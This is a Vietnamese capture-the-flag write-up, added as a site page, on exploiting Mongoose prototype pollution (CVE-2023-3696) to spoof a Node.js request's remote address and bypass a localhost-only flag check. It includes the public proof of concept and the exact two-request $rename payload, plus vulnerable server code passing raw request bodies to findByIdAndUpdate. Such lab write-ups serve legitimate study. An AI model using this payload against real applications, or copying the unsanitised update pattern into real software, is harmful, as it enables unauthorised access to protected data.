@@ -1,0 +1,181 @@
+---
+title: 'SECURE NOTE'
+date: '2026-04-24'
+description: 'Writeup chi tiết khai thác Prototype Pollution qua CVE-2023-3696 (Mongoose) và vượt rào IP Filter bằng Node.js Internals'
+ctf: 'CTF Challenge'
+category: 'Web Exploitation'
+difficulty: 'Easy'
+tags: ['Prototype Pollution', 'CVE-2023-3696', 'Node.js', 'Bypass']
+---
+
+<div className="writeup-content">
+
+<h1 className="writeup-title">SECURE NOTE</h1>
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/secure_note/htb.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '800px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Mở đầu</h2>
+
+Chúng ta được cung cấp một bài lab Whitebox với mã nguồn Node.js/Express sử dụng MongoDB (thông qua thư viện Mongoose). Mục tiêu tối thượng của bài này là đọc được cờ tại endpoint `GET /flag`.
+<br />
+Tuy nhiên, đường đến cờ không hề trải hoa hồng. Ứng dụng đã chặn đứng chúng ta bằng một đoạn check IP như sau:
+
+```javascript
+app.get('/flag', (req, res) => {
+    const remoteAddress = req.connection.remoteAddress;
+    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
+        res.send(process.env.FLAG ?? 'HTB{...}');
+    } else {
+        res.status(403).json({ Message: 'Access denied' });
+    }
+});
+```
+
+Tức là chỉ có local (127.0.0.1) mới lấy được cờ. Trừ khi ta đánh lừa được máy chủ tin rằng ta đang ở local.
+<br/>
+Với suy nghĩ ngây thơ ban đầu (cũng như nhiều challenge khác), mình nghĩ đây là một challenge lợi dụng SSRF để điều hướng Mongoose, sao cho nó truy cập tới endpoint /flag này. Một điều nữa, khi đọc Dockerfile thì không ghi rõ phiên bản của Mongo, thế là mình chủ quan bỏ qua.
+
+<br/>
+Tuy nhiên, không có cách nào để điều hướng hay gửi link gì cả, kết nối tới Mongo cũng được code cứng.
+```javascript
+const main = async () => {
+    try {
+        const uri = 'mongodb://localhost:27017/app';
+        await mongoose.connect(uri);
+        app.listen(port, () => {
+            console.debug(`Server started on port ${port}`);
+        });
+    } catch (error) {
+        console.error(error);
+        process.exit(1);
+    }
+};
+```
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Lần mò</h2>
+Để ý tới các tính năng của web và các untrusted data, bao gồm:<br/>
+-- Đưa vào title và content type. Thử test XSS và thất bại; hơn nữa, đoạn này cũng sanitize khá tốt.<br/>
+-- Delete và đọc lại note theo ID. Không có gì đáng nói. <br/>
+-- Update:
+```javascript 
+app.post('/update', async (req, res) => {
+    try {
+        const { noteId } = req.body;
+        await Note.findByIdAndUpdate(noteId, req.body);
+        let result = await Note.find({ _id: noteId });
+        res.json(result);
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ Message: "An error occurred" });
+    }
+});
+```
+Hàm `findByIdAndUpdate` nhận thẳng toàn bộ req.body từ người dùng mà không hề sanitize.<br/>
+Ban đầu, ý tưởng của mình là lợi dụng `findByIdAndUpdate`, biết đâu chỉnh sửa được gì đó trong `req.body`, từ đó gây ra lỗ hổng SSRF (thật cố chấp).
+
+<br/>
+Tuy nhiên nghiên cứu sâu hơn, mình tìm thấy bài viết `https://huntr.com/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467`. Trong đó tác giả nói về Mongoose Prototype Pollution khá hay. Đoạn code minh hoạ như sau:
+
+```javascript
+import { connect, model, Schema } from 'mongoose';
+
+await connect('mongodb://127.0.0.1:27017/exploit');
+
+const Example = model('Example', new Schema({ hello: String }));
+
+const example = await new Example({ hello: 'world!' }).save();
+await Example.findByIdAndUpdate(example._id, {
+    $rename: {
+        hello: '__proto__.polluted'
+    }
+});
+
+// this is what causes the pollution
+await Example.find();
+
+const test = {};
+console.log(test.polluted); // world!
+console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }
+
+process.exit();
+```
+Kết quả
+```python
+exploit> db.examples.find({})
+[
+  {
+    _id: ObjectId("64a757117e3dbf11b14e0fd4"),
+    __v: 0,
+    ['__proto__']: { polluted: 'world!' }
+  }
+]
+```
+
+Để tránh lan man, mời các bạn đọc bài viết trên. Tóm lại, bây giờ mình muốn lợi dụng lỗ hổng này để sửa lại `req.connection.remoteAddress` thành 127.0.0.1, từ đó có thể đọc được flag.
+
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Khó khăn và thử sai</h2>
+
+Thử ghi đè trực tiếp luôn
+```json
+{
+    "noteId": "...",
+    "__proto__": {
+        "remoteAddress": "127.0.0.1"
+    }
+}
+```
+Và tất nhiên là không thành công. Lý do như sau:<br/>
+Truy cập web được đại diện bởi `req.connection` (thực chất là một instance của lớp `net.Socket`). 
+Chuỗi kế thừa của nó trông như thế này:
+Instance -> Socket.prototype -> Stream.prototype -> ... -> Object.prototype. 
+Do đó khi ứng dụng gọi `req.connection.remoteAddress`, JS sẽ đi tìm từ dưới lên, và không đụng tới tận phần Object.prototype.
+<br/>
+Hơn thế nữa, do Schema Mongo ban đầu chỉ có `title` và `content`, `__proto__` không hề tồn tại, do đó Mongoose sẽ tự động loại bỏ trường này đi.
+Mã nguồn của `remoteAddress` như sau:
+```javascript
+get remoteAddress() {
+  if (this._peername) {
+    return this._peername.address;
+  }
+  // Nếu chưa có, gọi xuống tầng OS để check IP
+}
+```
+Bản chất, `$rename` là một toán tử dùng để đổi tên một field mà không thay đổi giá trị của nó.
+```
+{ "$rename": { "<tên_cũ>": "<tên_mới>" } }
+```
+<br/>
+Như vậy, tương tự như bài viết đã nêu ở trên, nếu sử dụng `$rename` thì điểm xuất phát sẽ là một note có sẵn trường title là 127.0.0.1. Từ đó mình sẽ gán field `title` này thành `__proto__._peername.address`, tức là thứ ta cần. Trong trường hợp này còn vượt qua điểm yếu ở chuỗi kế thừa đã nêu trên (do `__proto__._peername.address` được gọi tới trước).
+<br/>
+
+
+<h2 className="writeup-section-heading"><span className="writeup-hash">#</span> Tấn công</h2>
+**Bước 1**. Tạo một note mồi nhử, trong đó nhét sẵn IP cần thiết vào trường `title`.
+```
+POST /create HTTP/1.1
+
+{
+    "title": "127.0.0.1",
+    "content": "Test"
+}
+```
+**Bước 2**. Sử dụng prototype pollution:
+```
+POST /update HTTP/1.1
+
+{
+    "noteId": "69eb8166dd2a4421b23902b2",
+    "$rename": {
+        "title": "__proto__._peername.address"
+    }
+}
+```
+Và như vậy ta lấy được flag khi truy cập `/flag`.
+
+</div>
